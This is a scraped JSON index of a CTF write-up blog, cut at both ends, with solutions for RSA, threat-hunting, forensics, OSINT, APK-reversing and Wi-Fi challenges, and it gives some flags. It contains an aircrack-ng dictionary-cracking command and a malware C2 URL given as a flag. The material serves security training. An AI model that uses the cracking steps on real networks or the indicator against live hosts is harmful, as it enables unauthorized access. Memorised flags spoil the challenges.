28161864534081810305839467239167774824180698442991360538137338315924601027539535041400325106523598882827263670671140966855944057889837783992080270143420119844958855679728614805589197733901663249220100214524859116110365815705699485099116276988534253521580223115836247118089590595980346272692504104976860138248959015932618979651746563030552421216691329694961700647328850519321776696007920491542096366696034760558758393690945535590284240994579352805664119144134863786797266463118165575746650538843159490903440899114347091988968775074879305009340592457617508211781199057573663246634610497629416920053419998682083393087987 e = 3 C = 762355112596222421309825166446067448121886093544068458795156044255325081286699861240486430215279901835675723822721970949307265398924333599178805487220325668055743991293697494477706560130827449405781098938392283482757063955895656607033694619449376928780098570577226994800731087835230561205556094959240210387000 for t in range(10): m, is_true_root = gmpy2.iroot(t * N + C, e) if is_true_root: print(f\u0026#34;Found, Iteration = {t}\u0026#34;) print(m) print(f\u0026#34;Flag: {bytearray.fromhex(format(m, \u0026#39;x\u0026#39;)).decode()}\u0026#34;) break The resolution of the \u0026ldquo;Small Sage\u0026rdquo; challenge involved recognizing RSA encryption elements and leveraging a specialized script to handle the small e problem, resulting in the decryption of the encrypted data to obtain the flag.\nFlag The flag for this challenge is: ABOH23{rocky0ubrr!}.\nThis writeup demonstrates the process of identifying and decrypting an RSA-encrypted flag in the \u0026ldquo;Small Sage\u0026rdquo; CTF challenge. Should you require further clarification or have additional questions, please feel free to ask.\n","date":"2023-12-02T00:00:00Z","permalink":"https://qiaonpc.github.io/post/small-sage/","title":"Small Sage"},{"content":"Threat Hunting: Challenge 1 - CTF Challenge Writeup Challenge Information Name: Threat Hunting: Challenge 1 Objective: The objective of the \u0026ldquo;Threat Hunting: Challenge 1\u0026rdquo; CTF challenge is to investigate a ransomware-like attack scenario within a provided VM and identify the executable responsible for the encryption. Solution To successfully complete the \u0026ldquo;Threat Hunting: Challenge 1\u0026rdquo; challenge, I followed these steps:\nChallenge Context:\nThis challenge is part of a series in the threat hunting category and involves a provided VM named BOH_TH_2023. The VM needs to be extracted and loaded onto a virtualization platform like VMware or Oracle VirtualBox. It is recommended to solve this challenge before looking into Challenge 2 and Challenge 3 However, you can solve Challenge 2 and Challenge 3 in any order Initial VM Inspection:\nUpon loading the VM, it became apparent that the files were encrypted, resembling a ransomware attack scenario. The challenge also directed us to identify the executable responsible for the encryption.\nTherefore, it is safe to assumed that the ransomware executable has already been executed.\nUtilizing Amcache and Shimcache:\nAmcache and Shimcache are artifacts used in Windows systems to record executed executables.\nAmcache is a registry hive that records metadata and information about applications and programs executed on a Windows system. It provides a wealth of information about executed executables.\nAmcache is typically located in C:\\Windows\\appcompat\\Programs\\Amcache.hve. Shimcache, another Windows artifact, also records information about executed programs but in a different format. However, in this challenge, the Shimcache files are intentionally corrupted.\nAmcache Parsing:\nTo extract and process Amcache data, I utilized the AmcacheParser tool available at Eric Zimmerman\u0026rsquo;s website. The Amcache data is typically stored in C:\\Windows\\appcompat\\Programs\\Amcache.hve. I searched for this file and utilized AmcacheParser to process it. Processing Amcache Data:\nRunning AmcacheParser generated multiple CSV files, which I exported for easier analysis. These files can be explored using applications like Timeline Explorer or by downloading them from Eric Zimmerman\u0026rsquo;s website.\nFinding Suspicious Activity:\nBy examining the generated CSV files, I eventually identified something suspicious among the data, indicating the executable responsible for the encryption.\nFlag Discovery:\nThe identified executable responsible for the encryption is: ABOH{Mcqqic24UJyU40JKdja0A.exe}. The resolution of the \u0026ldquo;Threat Hunting: Challenge 1\u0026rdquo; involved extracting Amcache data from the provided VM, utilizing AmcacheParser to process the data, and investigating the executables to identify the suspicious file responsible for the encryption.\nFlag The flag for this challenge is: ABOH{Mcqqic24UJyU40JKdja0A.exe}.\nThis writeup demonstrates the process of investigating a ransomware-like attack scenario using Amcache parsing techniques in the \u0026ldquo;Threat Hunting: Challenge 1\u0026rdquo; CTF challenge. For further queries or clarifications, feel free to inquire.\n","date":"2023-12-02T00:00:00Z","permalink":"https://qiaonpc.github.io/post/threat-hunting-challenge-1/","title":"Threat Hunting Challenge 1"},{"content":"Threat Hunting: Challenge 2 - CTF Challenge Writeup Challenge Information Name: Threat Hunting: Challenge 2 Objective: The objective of the \u0026ldquo;Threat Hunting: Challenge 2\u0026rdquo; CTF challenge is to identify the SHA256 hash value of the executable responsible for exfiltrating data within a given context. Solution To successfully tackle the \u0026ldquo;Threat Hunting: Challenge 2\u0026rdquo; challenge, I followed these steps:\nChallenge Context:\nThis challenge is part of a series in the threat hunting category and requires identifying the SHA256 hash value of the executable responsible for data exfiltration. It is recommended to solve Challenge 1 before looking into Challenge 2 and Challenge 3 However, you can solve Challenge 2 and Challenge 3 in any order Identifying Suspicious Executables:\nOn further inspection from the first challenge, I discovered a total three suspicious files including the one from the first challenge.\nI dumped the two executables onto VirusTotal and HybridAnalysis, whilst analysed the powershell script myself.\nThe powershell script showed symptoms of reading files and encrypting it and I am suspecting that this is the file they are looking for, but not 100% certain.\nApproach to Finding SHA256 Hash:\nA common misconception might lead one to use Get-FileHash to find the hash value. However, in challenges like these, this method may not yield the expected results. This difference in hash values can be due to various factors and is further explained in this Stack Overflow thread. Using Hasher Tool:\nTo accurately acquire the SHA256 hash value of the suspicious files, I utilized the Hasher tool available at Eric Zimmerman\u0026rsquo;s website. Determining Executable\u0026rsquo;s SHA256 Hash:\nSince there were only three suspicious files discovered, and I am not so sure about my discovery, I will be calculating the SHA256 hash value for each of them using the Hasher tool and submitting as a flag. Final Flag Discovery:\nAmong the calculated SHA256 hash values, one matched the expected format of the flag: ABOH{hash_value}.\nAt the time of writing this writeup, I have forgotten which one was the flag. Im sorry.\nThe resolution of the \u0026ldquo;Threat Hunting: Challenge 2\u0026rdquo; involved identifying potentially malicious executables and determining their SHA256 hash values using the Hasher tool to extract the flag.\nFlag The flag for this challenge is: ABOH{hash_value}.\nThis writeup illustrates the process of identifying the SHA256 hash value of a potentially malicious executable in the \u0026ldquo;Threat Hunting: Challenge 2\u0026rdquo; CTF challenge. For further inquiries or clarifications, feel free to ask.\n","date":"2023-12-02T00:00:00Z","permalink":"https://qiaonpc.github.io/post/threat-hunting-challenge-2/","title":"Threat Hunting Challenge 2"},{"content":"Threat Hunting: Challenge 3 - CTF Challenge Writeup Challenge Information Name: Threat Hunting: Challenge 3 Objective: The objective of the \u0026ldquo;Threat Hunting: Challenge 3\u0026rdquo; CTF challenge is to identify the significant indicator related to a potentially malicious executable based on its behavior observed through external connections. Solution To successfully solve the \u0026ldquo;Threat Hunting: Challenge 3\u0026rdquo; challenge, I proceeded with the following steps:\nContext from Previous Challenge:\nContinuing from the previous challenge, I conducted further analysis on the executables by uploading them to security analysis platforms like VirusTotal and HybridAnalysis for comprehensive analysis. It is recommended to solve Challenge 1 before looking into Challenge 3 and Challenge 3 However, you can solve Challenge 3 and Challenge 3 in any order Analysis Results:\nUpon reviewing the analysis results from the previous challenge (VirusTotal and HybridAnalysis), I observed that both executables made external connections to IP addresses. However, one particular connection stood out among the rest. Flag Identification:\nAfter careful observation and analysis, I identified the standout indicator related to a potentially malicious executable, which is the URL or IP address: ABOH{http://146.190.89.115:8080/YPAPJDoGD3aIQlFix11ZA.php}. The resolution of the \u0026ldquo;Threat Hunting: Challenge 3\u0026rdquo; involved analyzing the behavior of potentially malicious executables and identifying the significant external connection, aiding in the discovery of the flag.\nFlag The flag for this challenge is: ABOH{http://146.190.89.115:8080/YPAPJDoGD3aIQlFix11ZA.php}.\nThis writeup demonstrates the process of analyzing executable behavior to identify significant indicators of potential malicious activity in the \u0026ldquo;Threat Hunting: Challenge 3\u0026rdquo; CTF challenge. For any further queries or clarifications, please feel free to inquire.\n","date":"2023-12-02T00:00:00Z","permalink":"https://qiaonpc.github.io/post/threat-hunting-challenge-3/","title":"Threat Hunting Challenge 3"},{"content":"Checkout my socials 1 - CTF Challenge Writeup Challenge: Checkout my socials 1\nPoints: 50\nCategory: OSINT (Open-Source Intelligence)\nObjective The objective of the \u0026ldquo;Checkout my socials 1\u0026rdquo; challenge is to gather information from publicly available sources (OSINT) to identify the username. You will be provided with a link, and your task is to find the username associated with it.\nSolution To successfully complete the \u0026ldquo;Checkout my socials 1\u0026rdquo; challenge, follow these steps:\nAccess the Provided Link:\nClick on the link provided in the challenge: https://imgur.com/xa4jBRt. Examine the Content:\nUpon visiting the link, you will be directed to a web page or image on Imgur. Identify the Username:\nLook for any visible information, such as a username, on the web page or image. Flag Identification:\nThe username you find on the web page or image is the flag for this challenge. Flag Discovery:\nAs you identify the username, you will uncover the hidden flag. The flag follows the format: petgrad2023{XXXXXXXXXX}. By following these steps and accessing the provided link, you will successfully retrieve the flag through OSINT techniques.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn \u0026ldquo;Checkout my socials 1\u0026rdquo; challenge, your task is to gather information from the provided link and identify the associated username. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/checkout-my-socials-1/","title":"Checkout my socials 1"},{"content":"Checkout my socials 3 - CTF Challenge Writeup Challenge: Checkout my socials 3\nPoints: 50\nCategory: OSINT (Open-Source Intelligence)\nObjective The objective of the \u0026ldquo;Checkout my socials 3\u0026rdquo; challenge is to gather information from publicly available sources (OSINT) to uncover the hidden flag. The challenge provides hints related to birds, and your task is to identify the Twitter or other social media account associated with the user.\nSolution To successfully complete the \u0026ldquo;Checkout my socials 3\u0026rdquo; challenge, follow these steps:\nAnalyze the Challenge Hint:\nThe challenge hints at birds, which implies you should look for a social media account related to birds or something bird-related. Search for Social Media Accounts:\nStart by searching for Twitter or other social media accounts associated with birds based on the hint. Use Quipquip for the Cipher:\nThe challenge likely involves deciphering a cipher. To solve it, use a tool like Quipquip. Flag Identification:\nOnce you find the social media account and decipher the cipher, you will identify the flag. Flag Discovery:\nAs you follow the hints and decode the message, you will uncover the hidden flag. The flag follows the format: petgrad2023{XXXXXXXXXX}. By following these steps and using OSINT techniques along with Quipquip, you will successfully retrieve the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn \u0026ldquo;Checkout my socials 3\u0026rdquo; challenge, your task is to leverage the provided hint and OSINT techniques to find the relevant social media account and decode the flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/checkout-my-socials-3/","title":"Checkout my socials 3"},{"content":"Cryptic Raven - CTF Challenge Writeup Challenge: Cryptic Raven\nPoints: 100\nCategory: Cryptography\nObjective The objective of the Cryptic Raven challenge is to decrypt a given message, which is encoded using an undisclosed encryption technique. Your task is to decipher the message and reveal the hidden flag.\nSolution To successfully complete the Cryptic Raven challenge, follow these steps:\nMessage Deciphering:\nBegin by examining the provided message. The challenge does not disclose the specific encryption technique used. Caesar Cipher Brute Force:\nGiven the lack of information about the encryption method, you can try a brute force approach, specifically the Caesar cipher brute force. The Caesar cipher is a simple and widely used substitution cipher where each letter in the plaintext is shifted a certain number of places down or up the alphabet. Brute Force Decryption:\nImplement a brute force decryption approach by trying all possible shifts within the Caesar cipher. Continue shifting the letters and evaluating the results until you find a meaningful message. Flag Discovery:\nAfter trying various shift values, you will eventually discover the flag concealed within the decrypted message. By successfully using the Caesar cipher brute force method, you\u0026rsquo;ll unveil the hidden flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the Cryptic Raven challenge, your cryptography skills are tested as you employ a brute force approach to decipher the message and reveal the flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/cryptic-raven/","title":"Cryptic Raven"},{"content":"Getmecorrect - CTF Challenge Writeup Challenge: Getmecorrect\nPoints: 150\nCategory: Reverse Engineering\nObjective The objective of the \u0026ldquo;Getmecorrect\u0026rdquo; challenge is to reverse engineer an APK file to uncover a hidden flag. The flag is divided into four parts, and you need to understand how these parts are constructed. However, a key part of the flag is implemented using native code, which is not available in the APK\u0026rsquo;s source code. Your task is to find a way to retrieve the missing part of the flag.\nSolution To successfully complete the \u0026ldquo;Getmecorrect\u0026rdquo; challenge, follow these steps:\nAnalyze the APK File:\nStart by opening and examining the APK file using tools like jadx-gui. Look for clues that reveal how the flag is constructed. Flag Part 3 and Native Code:\nWhile analyzing the APK, you will identify that the third part of the flag relies on the getNativeFlag() function. However, this function\u0026rsquo;s implementation is missing from the APK\u0026rsquo;s source code, and it is marked as \u0026ldquo;native.\u0026rdquo; Understanding Native Code:\nThe keyword \u0026ldquo;native\u0026rdquo; in the function declaration indicates that the function is implemented using native code, often written in a different programming language like C or C++. This means the actual implementation of getNativeFlagPart is not available in the provided APK source code. Reverse Engineering Native Code:\nTo retrieve the missing part of the flag, you need to reverse engineer the native code. Begin by converting the dynamic.apk to dynamic.zip, and then unzip the file. Examine the Lib Folder:\nNavigate to the lib folder, where you will find different architectures. Choose the one you are most comfortable with. In this case, the x86 architecture is used for analysis. Ghidra Analysis:\nWithin Ghidra, look for a function with a name that resembles the naming convention used throughout dynamic.apk. This function will likely contain the missing part of the flag. Retrieve the Missing Flag Part:\nBy examining the code in Ghidra, you can identify the third part of the flag. This part is not encrypted or hidden and is directly accessible in the function. Flag Discovery:\nAs you combine the parts of the flag revealed during your analysis, you will uncover the complete hidden flag. The flag follows the format: petgrad2023{XXXXXXXXXX}. By following these steps, you will successfully reverse engineer the APK and retrieve the missing part of the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Getmecorrect\u0026rdquo; challenge, you need to reverse engineer the APK to construct the flag correctly. Understanding native code and reverse engineering are crucial for solving this challenge. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/getmecorrect/","title":"Getmecorrect"},{"content":"Harmonic Secrets - CTF Challenge Writeup Challenge: Harmonic Secrets\nPoints: 100\nCategory: Cryptography\nObjective My objective in the Harmonic Secrets challenge was to decrypt a given ciphertext using the provided key, which I suspected to be a Vigenère cipher. My task was to apply the key and reveal the hidden flag.\nSolution To successfully complete the Harmonic Secrets challenge, I followed these steps:\nKey Analysis:\nI began by examining the provided key. Based on the challenge information, I suspected that it was a Vigenère cipher key. Vigenère Cipher Decryption:\nI applied the Vigenère decryption process using the provided key to decipher the given ciphertext. Flag Discovery:\nAfter successfully decrypting the ciphertext with the Vigenère key, I revealed the hidden flag. By following these steps and applying the Vigenère cipher decryption, I uncovered the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the Harmonic Secrets challenge, my cryptography skills came into play as I decrypted the Vigenère-encrypted message using the provided key to unveil the flag. It was a satisfying experience. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/harmonic-secrets/","title":"Harmonic Secrets"},{"content":"Intruding the Hidden Society - CTF Challenge Writeup Challenge: Intruding the Hidden Society\nPoints: 200\nCategory: Forensics\nObjective The objective of the \u0026ldquo;Intruding the Hidden Society\u0026rdquo; challenge is to extract hidden information from the provided pcap file and uncover the flag.\nSolution To solve the \u0026ldquo;Intruding the Hidden Society\u0026rdquo; challenge, I followed these steps:\nIdentified Patterns in DNS Packets:\nUpon analyzing the pcap file, I noticed that a significant portion of the packets were DNS (Domain Name System) packets. I started by filtering and analyzing these DNS packets. Pattern Identification:\nPay attention to the DNS packets with base64-like encodings. These packets had accompanying numbers, indicating an order for reconstruction. Packet Extraction:\nThe goal was to extract and reconstruct the base64-like encoded data. However, with more than 10,000 packets, manual extraction would be impractical. I used the \u0026ldquo;tshark\u0026rdquo; command-line tool to extract relevant packets. The following query is an example of how I extracted packets related to the challenge: 1 tshark -nr hiddensociety.pcap -Y \u0026#39;(ip.dst == 8.8.8.8) \u0026amp;\u0026amp; (dns.qry.name contains \u0026#34;challange.petronasgraduate.ctfd.io\u0026#34;)\u0026#39; \u0026gt; output.txt The output of the query was saved in the \u0026ldquo;output.txt\u0026rdquo; file. Data Extraction and Reconstruction:\nI created a Python script to process the \u0026ldquo;output.txt\u0026rdquo; file and extract the base64-like encoded data.\nThe extracted data was reconstructed and written into a separate file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import base64 base64_reconstructed = \u0026#34;\u0026#34; with open(\u0026#34;output.txt\u0026#34;, \u0026#34;r\u0026#34;) as file: content = file.readlines() for line in content: extract_number_and_base64 = line[:-1].split(\u0026#34; \u0026#34;)[-1].replace(\u0026#34;.challange.petronasgraduate.ctfd.io\u0026#34;, \u0026#34;\u0026#34;) extract_base64 = extract_number_and_base64.split(\u0026#34;.\u0026#34;)[1] base64_reconstructed += extract_base64 with open(\u0026#34;output\u0026#34;, \u0026#34;wb\u0026#34;) as file: file.write(base64.b64decode(base64_reconstructed)) Identified the Data Type:\nUsing the file command to determine the type of data contained in the reconstructed file. Flag Retrieval:\nThe reconstructed base64 is an image file. Open and view the image By following these steps, I was able to successfully uncover the hidden flag within the pcap file and complete the \u0026ldquo;Intruding the Hidden Society\u0026rdquo; challenge.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Intruding the Hidden Society\u0026rdquo; challenge, my goal was to decode and reconstruct base64-like encoded data found in DNS packets within a pcap file and reveal the flag concealed within the data.\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/intruding-the-hidden-society/","title":"Intruding the Hidden Society"},{"content":"m3m0irs - CTF Challenge Writeup Challenge: m3m0irs\nPoints: 50\nCategory: Memory Forensics\nObjective The objective of the m3m0irs challenge is to perform memory forensics on a memory dump file to uncover suspicious activity. Your task is to analyze the memory dump to identify the software that should not be running and reveal the hidden flag.\nSolution To successfully complete the m3m0irs challenge, follow these steps:\nMemory Dump Analysis:\nIn any memory forensics challenge, the first step is to determine the architecture of the system. You can achieve this using the volatility tool with the command: volatility -f \u0026lt;memory dump\u0026gt; imageinfo. The imageinfo command will provide suggested architectures based on the memory dump\u0026rsquo;s analysis. Architecture Identification:\nTry each of the suggested architectures until you find one that works for your analysis. You can use the following command to specify the architecture: volatility -f \u0026lt;memory dump\u0026gt; --profile=\u0026lt;architecture\u0026gt;. Identifying Suspicious Software:\nThe main objective is to identify software that shouldn\u0026rsquo;t be running. You can often find this information in the process lists of the memory dump. There are various ways to find processes in a memory dump, such as pstree, pslist, psscan etc. pstree\u0026quot; is a favorite among many analysts because it presents processes in a hierarchical manner, allowing you to easily trace parent and child processes. You can identify suspicious software based on the processes and their relationships in the tree. Analyzing with \u0026ldquo;pstree\u0026rdquo;:\nUse the following command to generate a pstree analysis and save it to a file for reference: volatility -f \u0026lt;memory dump\u0026gt; --profile=\u0026lt;architecture\u0026gt; pstree \u0026gt; pstree.txt. Saving the output to a file ensures that you can revisit the analysis without repeating the same steps. Flag Discovery:\nDuring your analysis, you may find Azureus to be suspicious as it spawned AzureusTor. This is the software that shouldn\u0026rsquo;t be running. By following these steps and conducting memory forensics analysis, you will uncover the suspicious software and reveal the hidden flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the m3m0irs challenge, memory forensics skills are put to the test as you analyze a memory dump to identify the suspicious software that shouldn\u0026rsquo;t be running. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/m3m0irs/","title":"m3m0irs"},{"content":"Marx\u0026rsquo;s Melodic Memoir - CTF Challenge Writeup Challenge: Marx\u0026rsquo;s Melodic Memoir\nPoints: 100\nCategory: Cryptography\nObjective The objective of the \u0026ldquo;Marx\u0026rsquo;s Melodic Memoir\u0026rdquo; challenge is to decode a given music sheet to reveal the hidden flag. Your task is to find a music sheet decoder, manually input every element from the picture, and decipher the flag.\nSolution To successfully complete the \u0026ldquo;Marx\u0026rsquo;s Melodic Memoir\u0026rdquo; challenge, follow these steps:\nMusic Sheet Provided:\nYou are provided with a music sheet that contains encoded information. Find a Music Sheet Decoder:\nYour first step is to search for music sheet decoders or tools designed to interpret encoded musical notations. Manual Decoding:\nUsing the music sheet decoder you find, manually input every element and symbol from the provided picture. Flag Discovery:\nAs you decode the music sheet, you will uncover the hidden flag, which follows the format: petgrad2023{XXXXXXXXXX}. By following these steps and decoding the music sheet, you will successfully reveal the flag hidden within Marx\u0026rsquo;s Melodic Memoir.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Marx\u0026rsquo;s Melodic Memoir\u0026rdquo; challenge, your task is to decode the provided music sheet and unveil the hidden flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/marxs-melodic-memoir/","title":"Marx's Melodic Memoir"},{"content":"Puzzles of An Altered History - CTF Challenge Writeup Challenge: Puzzles of An Altered History\nPoints: 150\nCategory: Wireless Networking\nObjective The objective of the \u0026ldquo;Puzzles of An Altered History\u0026rdquo; challenge is to crack the password for a given wireless network, which is stored in a provided pcap (packet capture) file. You will need to use a tool called \u0026ldquo;aircrack-ng\u0026rdquo; to successfully recover the network\u0026rsquo;s password.\nSolution To solve the \u0026ldquo;Puzzles of An Altered History\u0026rdquo; challenge, follow these steps:\nDownload and Open the pcap File:\nBegin by downloading the provided pcap file, which contains the network traffic data. Open the pcap file using a network analysis tool like Wireshark. Cracking the Password:\nUse the \u0026ldquo;aircrack-ng\u0026rdquo; tool to attempt to crack the wireless network\u0026rsquo;s password. The basic command structure for \u0026ldquo;aircrack-ng\u0026rdquo; is as follows: 1 aircrack-ng \u0026lt;pcap file\u0026gt; -w \u0026lt;wordlist\u0026gt; \u0026lt;pcap file\u0026gt;: Replace this with the name of the pcap file you are analyzing. \u0026lt;wordlist\u0026gt;: Specify the path to a wordlist file that \u0026ldquo;aircrack-ng\u0026rdquo; will use to attempt password combinations. Wordlist Selection:\nFor the wordlist, you can use a common password dictionary like \u0026ldquo;rockyou.txt,\u0026rdquo; which is available in various locations. You should specify the full path to the wordlist file. Run aircrack-ng:\nExecute the \u0026ldquo;aircrack-ng\u0026rdquo; command in your terminal, providing the pcap file and wordlist as arguments. For example: 1 aircrack-ng ctfwifi.cap -w /usr/share/wordlists/rockyou.txt Password Recovery:\n\u0026ldquo;aircrack-ng\u0026rdquo; will attempt to recover the password by testing combinations from the wordlist. When aircrack-ng successfully finds the correct password, it will display the password in the terminal. Flag Retrieval:\nThe cracked password will resemble the format specified in the challenge. Retrieve and present it as the flag to complete the challenge. By following these steps and using \u0026ldquo;aircrack-ng,\u0026rdquo; you can successfully crack the password for the wireless network captured in the pcap file and obtain the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Puzzles of An Altered History\u0026rdquo; challenge, your goal is to utilize network analysis tools to crack the wireless network\u0026rsquo;s password, revealing the flag upon successful recovery.\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/puzzles-of-an-altered-history/","title":"Puzzles of An Altered History"},{"content":"Reverseme - CTF Challenge Writeup Challenge: Reverseme\nPoints: 150\nCategory: Reverse Engineering\nObjective The objective of the \u0026ldquo;Reverseme\u0026rdquo; challenge is to reverse engineer an Android APK file and retrieve the hidden flag. You need to understand how APK files are structured, how strings are stored, and how resources are referenced in Android app development.\nSolution To successfully complete the \u0026ldquo;Reverseme\u0026rdquo; challenge, follow these steps:\nAnalyze the APK File:\nStart by examining the APK file using jadx-gui or a similar tool. You will need to navigate through the app\u0026rsquo;s code to find the flag. Flag Identification:\nDuring your analysis, you will come across a reference to the flag as R.string.flag. This indicates that the flag is retrieved from the app\u0026rsquo;s string resources. Accessing Resources:\nIn Android app development, the R.string is a reference to a string resource defined in the app\u0026rsquo;s resources. An APK file contains all the resources and code needed to run an Android application. When you see R.string.some_string, it refers to a string resource defined in the app\u0026rsquo;s res/values/strings.xml file. Strings.xml Examination:\nYou need to locate the strings.xml file within the APK\u0026rsquo;s resources. Navigate to the Resources folder, then to resources.arsc, and finally, to res/values. Use the search function (CTRL+F) to look for the \u0026ldquo;flag\u0026rdquo; string. This will allow you to find the flag in plain text. Flag Retrieval:\nBy examining the content of the strings.xml file, you can retrieve the hidden flag. Flag Discovery:\nAs you extract and decipher the flag, you will reveal the complete hidden flag. The flag follows the format: petgrad2023{XXXXXXXXXX}. By following these steps, you will successfully reverse engineer the APK and uncover the hidden flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Reverseme\u0026rdquo; challenge, understanding how Android APK files store resources and references to string resources is crucial. By navigating the app\u0026rsquo;s code and examining the strings.xml file, you can retrieve the flag and complete the challenge.\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/reverseme/","title":"Reverseme"},{"content":"STOP SPAMMING - CTF Challenge Writeup Challenge: STOP SPAMMING\nPoints: 100\nCategory: Miscellaneous\nObjective The objective of the STOP SPAMMING challenge is to decode a provided spam message using a spam decoder tool. Your task is to utilize the tool to uncover the hidden flag.\nSolution To successfully complete the STOP SPAMMING challenge, follow these steps:\nSpam Message Decoding:\nBegin by examining the provided spam message. The challenge hints at using a spam decoder tool. Spam Decoder Tool:\nThis challenge simplifies the task by directing you to a specific spam decoder tool. You can use the following online tool to decode the spam message: Spam Decoder Tool. Flag Discovery:\nBy utilizing the provided tool, you will decode the spam message and reveal the hidden flag. The STOP SPAMMING challenge, in this case, involves the straightforward use of a spam decoder tool to uncover the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the STOP SPAMMING challenge, you utilize a spam decoder tool to decode the spam message and reveal the flag. It\u0026rsquo;s a quick and straightforward solution to the challenge. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/stop-spamming/","title":"STOP SPAMMING"},{"content":"Temporal Traffic Traces - CTF Challenge Writeup Challenge: Temporal Traffic Traces\nPoints: 100\nCategory: Network Forensics\nObjective The objective of the \u0026ldquo;Temporal Traffic Traces\u0026rdquo; challenge is to analyze a provided pcap file and extract the hidden flag. Your task is to investigate the protocol hierarchy, identify relevant data, and decode the flag.\nSolution To successfully complete the \u0026ldquo;Temporal Traffic Traces\u0026rdquo; challenge, follow these steps:\nAnalyze the PCAP File:\nYou are given a pcap file, and the first thing to do is to analyze its contents. Check Protocol Hierarchy:\nExamine the protocol hierarchy within the pcap file. Look for any anomalies or unusual combinations of protocols. Focus on HTTP Traffic:\nIn this challenge, it\u0026rsquo;s essential to focus on HTTP traffic. You can identify and extract HTTP packets, which may contain relevant data. Export HTTP Packets as Files:\nUsing a tool like Wireshark\u0026rsquo;s export functionality, extract HTTP packets as files for closer inspection. Identify Base64 Encoding:\nDuring your analysis, you may come across a base64 encoded message within the extracted files. Decode the Message:\nDecode the base64-encoded message to unveil the hidden flag. Flag Discovery:\nAs you decode the message, you will discover the flag hidden within the \u0026ldquo;Temporal Traffic Traces.\u0026rdquo; The flag follows the format: petgrad2023{XXXXXXXXXX}. By following these steps and investigating the pcap file\u0026rsquo;s network traffic, you will successfully reveal the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Temporal Traffic Traces\u0026rdquo; challenge, your task is to analyze network traffic within a pcap file, extract the relevant data, and decode the hidden flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/temporal-traffic-traces/","title":"Temporal Traffic Traces"},{"content":"The Early Quantum Supercomputer I - CTF Challenge Writeup Challenge: The Early Quantum Supercomputer I\nPoints: 100\nCategory: Network Forensics, Operational Technology\nObjective The objective of \u0026ldquo;The Early Quantum Supercomputer I\u0026rdquo; challenge is to analyze a provided pcap file and identify an uncommon protocol to uncover the hidden flag. Your task is to investigate the network traffic and pinpoint the unique protocol.\nSolution To successfully complete \u0026ldquo;The Early Quantum Supercomputer I\u0026rdquo; challenge, follow these steps:\nAnalyze the PCAP File:\nBegin by opening the provided pcap file. Examine Network Traffic:\nScrutinize the network traffic captured within the pcap file. Identify Uncommon Protocols:\nPay close attention to the protocols being used. Look for any uncommon or unusual protocols that may stand out. Flag Identification:\nThe flag is hidden within the uncommon protocol you identify during your analysis. Flag Discovery:\nAs you identify the unique protocol, you will uncover the hidden flag. The flag is the uncommon protocol. By following these steps and investigating the network traffic within the pcap file, you will successfully reveal the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn \u0026ldquo;The Early Quantum Supercomputer I\u0026rdquo; challenge, your task is to analyze network traffic within a pcap file and identify the uncommon protocol that hides the flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/the-early-quantum-supercomputer-i/","title":"The Early Quantum Supercomputer I"},{"content":"The Enigmatic Manuscript - CTF Challenge Writeup Challenge: The Enigmatic Manuscript\nPoints: 50\nCategory: Cryptography\nObjective The objective of The Enigmatic Manuscript challenge is to uncover a hidden flag concealed within an image. Your task is to utilize cryptographic techniques to decipher the flag hidden within the image.\nSolution To successfully complete The Enigmatic Manuscript challenge, follow these steps:\nImage Analysis:\nBegin by examining the provided image. In this challenge, images often hide clues or messages within their metadata or content. Exiftool Inspection:\nUse the exiftool utility to inspect the image\u0026rsquo;s metadata and content for any hidden information. Base64 Encoding:\nUpon using exiftool on the image, you may discover a base64 encoded message within the image\u0026rsquo;s metadata or content. Message Decryption:\nDecode the base64 encoded message to reveal the hidden flag. After following these steps and decoding the base64 message, you will successfully uncover the flag concealed within the image.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn The Enigmatic Manuscript challenge, your cryptography skills come into play as you decode the base64 message hidden within the image to unveil the flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/the-enigmatic-manuscript/","title":"The Enigmatic Manuscript"},{"content":"The Quantum Nexus Prototype - CTF Challenge Writeup Challenge: The Quantum Nexus Prototype\nPoints: 50\nCategory: OSINT, Cryptography\nObjective The objective of \u0026ldquo;The Quantum Nexus Prototype\u0026rdquo; 